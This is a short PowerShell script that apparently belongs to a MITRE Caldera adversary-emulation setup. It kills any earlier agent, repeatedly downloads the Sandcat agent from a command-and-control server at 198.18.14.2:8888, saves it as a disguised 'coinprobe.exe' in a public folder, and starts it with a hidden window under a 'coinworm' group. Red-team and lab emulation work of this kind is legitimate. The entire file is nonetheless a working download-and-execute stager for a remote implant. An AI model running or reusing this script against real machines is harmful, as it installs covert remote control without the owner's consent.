$server = "http://198.18.14.2:8888"
$url = "$server/file/download"
$targetPath = "C:\Users\Public\coinprobe.exe"
$group = "coinworm"
$retryInterval = 30  # seconds

# Stop and remove any existing agent
Get-Process | Where-Object { $_.Path -eq $targetPath } | Stop-Process -Force -ErrorAction SilentlyContinue
Remove-Item -Force $targetPath -ErrorAction SilentlyContinue

# Retry loop to download Sandcat from Caldera
while ($true) {
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("platform", "windows")
        $wc.Headers.Add("file", "sandcat.go")
        $data = $wc.DownloadData($url)

        # Write to disk and break out of loop
        [IO.File]::WriteAllBytes($targetPath, $data) | Out-Null
        break
    } catch {
        Write-Host "[-] Caldera not reachable. Retrying in $retryInterval seconds..."
        Start-Sleep -Seconds $retryInterval
    }
}

# Start agent
Start-Process -FilePath $targetPath -ArgumentList "-server $server -group $group" -WindowStyle Hidden
